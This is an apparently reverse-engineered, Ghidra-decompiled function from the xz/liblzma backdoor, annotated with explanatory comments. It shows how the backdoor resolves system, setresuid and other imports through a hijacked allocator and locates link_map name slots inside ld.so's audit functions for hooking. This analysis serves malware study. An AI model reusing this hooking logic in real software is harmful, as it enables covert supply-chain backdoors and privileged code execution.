// /home/kali/xzre-ghidra/xzregh/104080_find_link_map_l_name.c
// Function: find_link_map_l_name @ 0x104080
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_link_map_l_name(backdoor_data_handle_t * data_handle, ptrdiff_t * libname_offset, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Locates liblzma’s live `link_map::l_name` byte and resolves the libc/libcrypto imports required for the audit-hook pivot. The helper
 * runs every lookup through the fake liblzma allocator (logging the probe via `secret_data_append_from_address`) so it can safely
 * pull in `exit`, `setlogmask`, `setresgid`, `setresuid`, `system`, `shutdown`, and `BN_num_bits`. With `_dl_audit_preinit`
 * validated inside ld.so, it walks the baked link_map snapshot until a candidate entry’s RELRO tuple matches the runtime liblzma
 * image, then measures the displacement between the snapshot and runtime pointer. That delta populates both `*libname_offset` and
 * `hooks->ldso_ctx.libcrypto_l_name`, and the helper insists that `_dl_audit_preinit` and `_dl_audit_symbind_alt` each issue an
 * LEA that applies the same delta before finalizing the import list.
 */

#include "xzre_types.h"

BOOL find_link_map_l_name
               (backdoor_data_handle_t *data_handle,ptrdiff_t *libname_offset,
               backdoor_hooks_data_t *hooks,imported_funcs_t *imported_funcs)

{
  libc_imports_t *libc_imports;
  elf_info_t *ldso_image;
  link_map *candidate_runtime_map;
  dl_audit_symbind_alt_fn code_start;
  BOOL status_ok;
  ptrdiff_t libname_snapshot_offset;
  lzma_allocator *allocator;
  pfn_exit_t exit_fn;
  pfn_setlogmask_t setlogmask_fn;
  pfn_setresgid_t setresgid_fn;
  lzma_allocator *libcrypto_allocator;
  Elf64_Sym *audit_preinit_symbol;
  pfn_BN_num_bits_t bn_num_bits_fn;
  uchar *audit_sym_start;
  pfn_setresuid_t setresuid_fn;
  pfn_system_t system_fn;
  pfn_shutdown_t shutdown_fn;
  link_map *best_snapshot_slot;
  link_map *best_runtime_map;
  u64 displacement;
  link_map *snapshot_slot;
  link_map *runtime_upper_bound;
  link_map *snapshot_cursor;
  
  // AutoDoc: Log the recon step through the secret-data channel so later telemetry can tie GOT patches back to this probe.
  status_ok = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x6c,0x10,5);
  if (status_ok != FALSE) {
    libc_imports = imported_funcs->libc;
    snapshot_cursor = data_handle->runtime_data->liblzma_link_map;
    // AutoDoc: Route libc imports through the attacker-controlled allocator so `lzma_alloc` lands on the right PLT offsets.
    allocator = get_lzma_allocator();
    allocator->opaque = data_handle->cached_elf_handles->libc;
    // AutoDoc: Each `lzma_alloc` call reuses the fake allocator offsets to resolve the target libc symbol and bump the import counter.
    exit_fn = (pfn_exit_t)lzma_alloc(0x8a8,allocator);
    libc_imports->exit = exit_fn;
    if (exit_fn != (pfn_exit_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    setlogmask_fn = (pfn_setlogmask_t)lzma_alloc(0x428,allocator);
    libc_imports->setlogmask = setlogmask_fn;
    if (setlogmask_fn != (pfn_setlogmask_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    setresgid_fn = (pfn_setresgid_t)lzma_alloc(0x5f0,allocator);
    libc_imports->setresgid = setresgid_fn;
    if (setresgid_fn != (pfn_setresgid_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    libcrypto_allocator = get_lzma_allocator();
    ldso_image = data_handle->cached_elf_handles->ldso;
    libcrypto_allocator->opaque = data_handle->cached_elf_handles->libcrypto;
    // AutoDoc: Only proceed when ld.so exposes `_dl_audit_preinit`; its body contains the LEA we pattern-match later.
    audit_preinit_symbol = elf_symbol_get(ldso_image,STR_dl_audit_preinit,0);
    if (audit_preinit_symbol != (Elf64_Sym *)0x0) {
      bn_num_bits_fn = (pfn_BN_num_bits_t)lzma_alloc(0x4e0,libcrypto_allocator);
      imported_funcs->BN_num_bits = bn_num_bits_fn;
      if (bn_num_bits_fn != (pfn_BN_num_bits_t)0x0) {
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
      }
      ldso_image = data_handle->cached_elf_handles->ldso;
      audit_sym_start = ldso_image->elfbase->e_ident + audit_preinit_symbol->st_value;
      // AutoDoc: Clamp the `_dl_audit_preinit` span to mapped ld.so pages so bogus symbol data cannot trick the search.
      status_ok = elf_contains_vaddr(ldso_image,audit_sym_start,audit_preinit_symbol->st_size,4);
      snapshot_slot = snapshot_cursor + 0x960;
      if (status_ok != FALSE) {
LAB_001041f0:
        if (snapshot_cursor != snapshot_slot) {
          ldso_image = data_handle->cached_elf_handles->liblzma;
          // AutoDoc: Skip snapshot entries whose RELRO tuple doesn’t match the running liblzma image.
          if ((*(u64 *)snapshot_cursor != ldso_image->gnurelro_vaddr) ||
             (*(u64 *)(snapshot_cursor + 8) != ldso_image->gnurelro_memsize)) goto LAB_001041ec;
          best_snapshot_slot = (link_map *)0x0;
          best_runtime_map = (link_map *)0xffffffffffffffff;
          // AutoDoc: Walk the baked link_map array and pick the runtime pointer whose address range overlaps the cached struct.
          for (snapshot_slot = data_handle->runtime_data->liblzma_link_map; snapshot_slot < snapshot_cursor + 0x18;
              snapshot_slot = snapshot_slot + 8) {
            candidate_runtime_map = *(link_map **)snapshot_slot;
            if (snapshot_cursor + 0x18 <= candidate_runtime_map) {
              runtime_upper_bound = best_runtime_map;
              if (snapshot_cursor + 0x68 <= best_runtime_map) {
                runtime_upper_bound = snapshot_cursor + 0x68;
              }
              if (candidate_runtime_map < runtime_upper_bound) {
                best_snapshot_slot = snapshot_slot;
                best_runtime_map = candidate_runtime_map;
              }
            }
          }
          if (best_runtime_map != (link_map *)0xffffffffffffffff) {
            allocator->opaque = data_handle->cached_elf_handles->libc;
            setresuid_fn = (pfn_setresuid_t)lzma_alloc(0xab8,allocator);
            libc_imports->setresuid = setresuid_fn;
            if (setresuid_fn != (pfn_setresuid_t)0x0) {
              libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
            }
            snapshot_cursor = data_handle->runtime_data->liblzma_link_map;
            // AutoDoc: Measure how far the runtime `link_map` lives from the snapshot; this becomes `*libname_offset`.
            displacement = (long)best_runtime_map - (long)snapshot_cursor;
            // AutoDoc: Reuse the same offset against the cached libcrypto map so both libraries’ `l_name` slots are addressed consistently.
            libname_snapshot_offset = (int)snapshot_cursor - (int)best_snapshot_slot;
            if (snapshot_cursor <= best_snapshot_slot) {
              libname_snapshot_offset = (int)best_snapshot_slot - (int)snapshot_cursor;
            }
            // AutoDoc: Point the libcrypto `l_name` pointer at the runtime map so later hooks can mirror the forged basename there too.
            (hooks->ldso_ctx).libcrypto_l_name =
                 (char **)(data_handle->runtime_data->libcrypto_link_map + libname_snapshot_offset);
            // AutoDoc: Require `_dl_audit_preinit` to materialise the displacement via LEA before trusting the offset.
            status_ok = find_lea_instruction(audit_sym_start,audit_sym_start + audit_preinit_symbol->st_size,displacement)
            ;
            if (status_ok == FALSE) {
              return FALSE;
            }
            // AutoDoc: Grab `_dl_audit_symbind_alt`’s entry point so the second LEA search runs against its relocated body.
            code_start = (hooks->ldso_ctx)._dl_audit_symbind_alt;
            // AutoDoc: Mirror the LEA search inside `_dl_audit_symbind_alt` to ensure both audit paths agree on the displacement.
            status_ok = find_lea_instruction
                              ((u8 *)code_start,
                               (u8 *)(code_start + (hooks->ldso_ctx)._dl_audit_symbind_alt__size),
                               displacement);
            if (status_ok == FALSE) {
              return FALSE;
            }
            allocator->opaque = data_handle->cached_elf_handles->libc;
            system_fn = (pfn_system_t)lzma_alloc(0x9f8,allocator);
            libc_imports->system = system_fn;
            if (system_fn != (pfn_system_t)0x0) {
              libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
            }
            shutdown_fn = (pfn_shutdown_t)lzma_alloc(0x760,allocator);
            libc_imports->shutdown = shutdown_fn;
            if (shutdown_fn != (pfn_shutdown_t)0x0) {
              libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
            }
            libcrypto_allocator->opaque = data_handle->cached_elf_handles->libcrypto;
            *libname_offset = displacement;
            return TRUE;
          }
        }
      }
      lzma_free(imported_funcs->BN_num_bits,libcrypto_allocator);
    }
  }
  return FALSE;
LAB_001041ec:
  snapshot_cursor = snapshot_cursor + 8;
  goto LAB_001041f0;
}

